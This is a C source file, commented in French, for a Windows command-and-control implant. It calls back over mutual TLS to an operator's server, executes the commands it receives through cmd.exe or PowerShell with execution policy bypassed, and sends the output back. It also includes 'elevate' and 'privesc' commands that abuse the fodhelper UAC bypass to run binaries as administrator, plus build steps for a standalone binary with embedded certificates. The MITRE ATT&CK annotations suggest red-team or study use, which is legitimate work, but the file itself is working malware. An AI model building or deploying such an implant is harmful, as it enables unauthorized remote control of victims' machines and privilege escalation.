/*
 * implant.c — Implant C2 en C avec TLS mutuel (mTLS).
 *
 * Tourne sur Windows (compilé nativement avec MSYS2 MINGW64 ou cross-compilé
 * depuis Linux avec mingw-w64).
 *
 * Architecture :
 *   L'implant est le CLIENT TLS. Il se connecte au serveur C2 (c2_server.c)
 *   et attend des commandes. Les réponses sont renvoyées chiffrées via mTLS.
 *
 * Comportement :
 *   1. Fixe le CWD au dossier de l'exe (pour trouver .env et certs/).
 *   2. Charge la configuration depuis .env (IP, port, chemins des certs).
 *   3. Connexion TLS vers le C2 (retry toutes les 5s si indisponible).
 *   4. Boucle de commandes :
 *      - Reçoit une commande du C2 via TLS.
 *      - Exécute via cmd.exe, PowerShell, ou module interne.
 *      - Renvoie la sortie suivie du marqueur de fin "\x00END".
 *   5. Sur 'exit' : envoie "BYE" et ferme proprement.
 *   6. Sur déconnexion : reconnexion automatique après 5s.
 *
 * Commandes supportées :
 *   <commande>           — exécution via cmd.exe (T1059.003)
 *   ps <commande>        — exécution via PowerShell (T1059.001)
 *   elevate              — UAC bypass fodhelper auto (T1548.002)
 *   privesc <exe_path>   — UAC bypass fodhelper manuel (T1548.002)
 *   exit                 — arrêt propre de l'implant
 *
 * Modes de compilation :
 *   Standard (nécessite .env + certs/ à côté de l'exe) :
 *     gcc -Wall -Wextra -DC2_IP=\"IP\" -DC2_PORT=PORT \
 *         -o implant.exe implant.c tls.c privesc.c \
 *         -lssl -lcrypto -lws2_32 -lgdi32 -lcrypt32 -lshell32 -static -s
 *
 *   Standalone (certs embarqués dans le binaire, zéro dépendance) :
 *     bash gen-embed.sh certs          # génère embedded_certs.h
 *     gcc -Wall -Wextra -DEMBED_CERTS -DC2_IP=\"IP\" -DC2_PORT=PORT \
 *         -o implant.exe implant.c tls.c privesc.c \
 *         -lssl -lcrypto -lws2_32 -lgdi32 -lcrypt32 -lshell32 -static -s
 *
 * MITRE ATT&CK :
 *   T1059.003 — Command and Scripting Interpreter: cmd.exe
 *   T1059.001 — Command and Scripting Interpreter: PowerShell
 *   T1548.002 — Abuse Elevation Control Mechanism: Bypass UAC
 *   T1071.001 — Application Layer Protocol (HTTPS/TLS)
 *   T1573.001 — Encrypted Channel (mTLS)
 */

#ifdef _WIN32
#  include <windows.h>  /* Sleep, DWORD, GetModuleFileNameA, MAX_PATH */
#else
#  include <unistd.h>   /* sleep (pour tests sur Linux) */
#endif

#include "tls.h"
#include "privesc.h"
#include <stdio.h>
#include <string.h>

/* Mode standalone : les certificats sont embarqués dans le binaire
 * sous forme de tableaux d'octets (générés par gen-embed.sh).
 * Pas besoin de .env ni de certs/ sur la cible. */
#ifdef EMBED_CERTS
#include "embedded_certs.h"
#endif

/* IP et port du C2.
 * Priorité : macro compilation (-DC2_IP=...) > .env > défaut.
 * En mode standalone, seules les macros comptent. */
#ifndef C2_IP
#  define C2_IP NULL
#endif
#ifndef C2_PORT
#  define C2_PORT 0
#endif

#define BUFFER_SIZE 65536  /* taille max de la sortie d'une commande   */
#define CMD_SIZE    1024   /* taille max d'une commande reçue du C2    */
#define RETRY_DELAY 5      /* secondes entre les tentatives de reconnexion */

/* ========================= Exécution de commandes ========================= */

/*
 * run_pipe — Exécute une commande via le shell et capture la sortie (stdout).
 *
 * Utilise _popen/popen pour lancer un processus fils et lire sa sortie
 * dans buf (jusqu'à buf_len-1 octets). Retourne le nombre d'octets lus.
 *
 * Portable : _popen sur Windows, popen sur Linux.
 */
static int run_pipe(const char *cmdline, char *buf, int buf_len) {
    FILE *fp;
    int   total = 0;
    int   n;

#ifdef _WIN32
    fp = _popen(cmdline, "r");
#else
    fp = popen(cmdline, "r");
#endif
    if (!fp) {
        const char *err = "[implant] Impossible d'executer la commande\r\n";
        int         el  = (int)strlen(err);
        if (el < buf_len) { memcpy(buf, err, el); total = el; }
        return total;
    }
    while ((n = (int)fread(buf + total, 1, (size_t)(buf_len - 1 - total), fp)) > 0) {
        total += n;
        if (total >= buf_len - 1) break;
    }
#ifdef _WIN32
    _pclose(fp);
#else
    pclose(fp);
#endif
    buf[total] = '\0';
    return total;
}

/* Exécute via cmd.exe — MITRE T1059.003 */
static int exec_cmd(const char *cmd, char *buf, int buf_len) {
    return run_pipe(cmd, buf, buf_len);
}

/* Exécute via PowerShell — MITRE T1059.001
 * Flags : -NoProfile (pas de profil utilisateur), -NonInteractive,
 *         -ExecutionPolicy Bypass (ignore les restrictions de scripts). */
static int exec_ps(const char *cmd, char *buf, int buf_len) {
    char ps_cmd[CMD_SIZE + 128];
    snprintf(ps_cmd, sizeof(ps_cmd),
             "powershell.exe -NoProfile -NonInteractive "
             "-ExecutionPolicy Bypass -Command \"%s\"", cmd);
    return run_pipe(ps_cmd, buf, buf_len);
}

/* ========================= Point d'entrée ========================= */

int main(void) {
#ifdef _WIN32
    /* Fixe le CWD au dossier contenant l'exe.
     *
     * Problème résolu : quand l'implant est lancé via le UAC bypass
     * (fodhelper.exe), Windows le démarre avec CWD=C:\Windows\System32.
     * Du coup cfg_load(".env") et les chemins relatifs des certs échouent.
     *
     * Solution : GetModuleFileNameA retourne le chemin complet de l'exe,
     * on coupe après le dernier '\' pour obtenir le dossier, et on y
     * positionne le CWD avec SetCurrentDirectoryA. */
    {
        char path[MAX_PATH];
        DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
        if (len > 0 && len < MAX_PATH) {
            char *sep = strrchr(path, '\\');
            if (sep) { *sep = '\0'; SetCurrentDirectoryA(path); }
        }
    }
#endif

    /* Charge la configuration (.env) : SERVER_IP, SERVER_PORT, chemins certs.
     * En mode standalone (-DEMBED_CERTS), le .env est optionnel (les certs
     * sont dans le binaire), mais SERVER_IP peut encore être lu depuis .env. */
    cfg_load(".env");

    /* Résolution de l'IP et du port du C2.
     * Ordre de priorité :
     *   1. Macro de compilation (-DC2_IP="...")  → valeur fixée dans le binaire
     *   2. .env (SERVER_IP=...)                  → fichier de config sur la cible
     *   3. Défaut (127.0.0.1:4444)               → loopback pour tests */
    const char *ip   = cfg_get("SERVER_IP", C2_IP ? C2_IP : "127.0.0.1");
    int         port = C2_PORT ? C2_PORT : cfg_port();

    /* Initialisation réseau (WSAStartup sur Windows) */
    if (tls_init() != 0)
        return 1;

    /* === Boucle de connexion ===
     * Si le C2 est indisponible, l'implant réessaie toutes les RETRY_DELAY
     * secondes. Si la connexion est perdue, il se reconnecte. */
    for (;;) {
        /* Connexion TLS vers le C2.
         * Mode standard : charge les certs depuis les fichiers (certs/).
         * Mode standalone : charge les certs depuis les tableaux en mémoire. */
#ifdef EMBED_CERTS
        tls_conn *c = tls_connect_embedded(ip, port,
                          embed_ca_crt, embed_ca_crt_len,
                          embed_client_crt, embed_client_crt_len,
                          embed_client_key, embed_client_key_len);
#else
        tls_conn *c = tls_connect(ip, port);
#endif
        if (!c) {
            /* C2 indisponible — attend avant de réessayer */
#ifdef _WIN32
            Sleep(RETRY_DELAY * 1000);
#else
            sleep(RETRY_DELAY);
#endif
            continue;
        }

        /* === Boucle de commandes ===
         * Reçoit une commande du C2, l'exécute, renvoie la sortie.
         * Chaque réponse se termine par le marqueur "\x00END" (4 octets)
         * pour que le C2 sache où s'arrête la sortie. */
        char cmd[CMD_SIZE];
        char buf[BUFFER_SIZE];
        int  n;

        while ((n = tls_recv(c, cmd, sizeof(cmd) - 1)) > 0) {
            cmd[n] = '\0';

            /* exit — arrêt propre de l'implant */
            if (strcmp(cmd, "exit") == 0) {
                tls_send(c, "BYE", 3);
                tls_close(c);
                tls_cleanup();
                return 0;
            }

            /* elevate — élévation de privilèges automatique (T1548.002)
             *
             * L'implant détecte son propre chemin avec GetModuleFileNameA,
             * puis appelle privesc_uac_bypass() qui :
             *   1. Écrit le chemin dans la clé de registre HKCU ms-settings
             *   2. Lance fodhelper.exe (auto-elevate, pas de prompt UAC)
             *   3. fodhelper exécute l'implant en administrateur
             *   4. L'implant élevé se connecte au C2 → nouvelle session
             *
             * Le C2 détecte la nouvelle session et switch dessus. */
            if (strcmp(cmd, "elevate") == 0) {
#ifdef _WIN32
                char self[MAX_PATH];
                DWORD slen = GetModuleFileNameA(NULL, self, MAX_PATH);
                if (slen == 0 || slen >= MAX_PATH) {
                    const char *e = "[elevate] error — cannot resolve own path\r\n\x00END";
                    tls_send(c, e, (int)strlen(e) - 3 + 4);
                    continue;
                }
                int rc = privesc_uac_bypass(self);
                int out_len;
                if (rc == 0)
                    out_len = snprintf(buf, BUFFER_SIZE - 4,
                        "[elevate] success — %s launched as admin\r\n", self);
                else
                    out_len = snprintf(buf, BUFFER_SIZE - 4,
                        "[elevate] error (code %d)\r\n", rc);
                buf[out_len]     = '\x00';
                buf[out_len + 1] = 'E';
                buf[out_len + 2] = 'N';
                buf[out_len + 3] = 'D';
                tls_send(c, buf, out_len + 4);
#else
                const char *e = "[elevate] not supported on this platform\r\n\x00END";
                tls_send(c, e, (int)strlen(e));
#endif
                continue;
            }

            /* privesc <exe_path> — UAC bypass manuel (T1548.002)
             * Comme 'elevate' mais avec un chemin spécifié par l'opérateur.
             * Utile pour lancer un autre binaire en admin. */
            if (strncmp(cmd, "privesc ", 8) == 0) {
                const char *exe = cmd + 8;
                int rc = privesc_uac_bypass(exe);
                int out_len;
                if (rc == 0)
                    out_len = snprintf(buf, BUFFER_SIZE - 4,
                        "[privesc] success — %s launched as admin "
                        "via fodhelper UAC bypass\r\n", exe);
                else if (rc == -1)
                    out_len = snprintf(buf, BUFFER_SIZE - 4,
                        "[privesc] error — registry write failed or "
                        "exe not found: %s\r\n", exe);
                else if (rc <= -1000)
                    out_len = snprintf(buf, BUFFER_SIZE - 4,
                        "[privesc] error — ShellExecuteEx fodhelper "
                        "failed (GetLastError=%d)\r\n", -(rc + 1000));
                else
                    out_len = snprintf(buf, BUFFER_SIZE - 4,
                        "[privesc] error — fodhelper launch failed "
                        "(code %d)\r\n", rc);
                buf[out_len]     = '\x00';
                buf[out_len + 1] = 'E';
                buf[out_len + 2] = 'N';
                buf[out_len + 3] = 'D';
                tls_send(c, buf, out_len + 4);
                continue;
            }

            /* ps <commande> — exécution PowerShell (T1059.001) */
            if (strncmp(cmd, "ps ", 3) == 0) {
                int out_len = exec_ps(cmd + 3, buf, BUFFER_SIZE - 4);
                buf[out_len]     = '\x00';
                buf[out_len + 1] = 'E';
                buf[out_len + 2] = 'N';
                buf[out_len + 3] = 'D';
                tls_send(c, buf, out_len + 4);
                continue;
            }

            /* Commande par défaut — exécution cmd.exe (T1059.003) */
            int out_len = exec_cmd(cmd, buf, BUFFER_SIZE - 4);

            /* Ajoute le marqueur "\x00END" (4 octets) en fin de payload.
             * Le C2 utilise ce marqueur pour détecter la fin de la réponse
             * et réafficher le prompt. */
            buf[out_len]     = '\x00';
            buf[out_len + 1] = 'E';
            buf[out_len + 2] = 'N';
            buf[out_len + 3] = 'D';

            if (tls_send(c, buf, out_len + 4) <= 0)
                break; /* connexion perdue → sort de la boucle de commandes */
        }

        /* Connexion perdue — ferme et retente après RETRY_DELAY secondes */
        tls_close(c);
#ifdef _WIN32
        Sleep(RETRY_DELAY * 1000);
#else
        sleep(RETRY_DELAY);
#endif
    }
}
